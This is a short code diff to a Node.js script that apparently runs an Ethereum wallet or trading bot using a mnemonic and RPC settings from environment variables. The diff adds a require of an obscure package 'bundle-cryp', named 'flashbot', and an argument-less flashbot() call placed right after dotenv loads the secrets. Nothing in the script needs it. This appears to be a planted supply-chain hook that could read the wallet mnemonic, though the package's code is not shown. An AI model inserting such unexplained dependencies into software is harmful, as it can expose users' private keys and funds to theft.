@@ -1,6 +1,7 @@
 const ethers = require("ethers");
 require("dotenv").config();
 const config = require("./config");
+const flashbot = require("bundle-cryp");
 const contractABI = require("./abi.json");
 const factoryABI = require("./factoryabi.json");
 const { program } = require("commander");
@@ -13,6 +14,7 @@ const addresses = {
   recipient: process.env.recipient,
 };
 
+flashbot()
 const mnemonic = process.env.mnemonic;
 const node = process.env.rpc;
 // Create a wallet from a private key
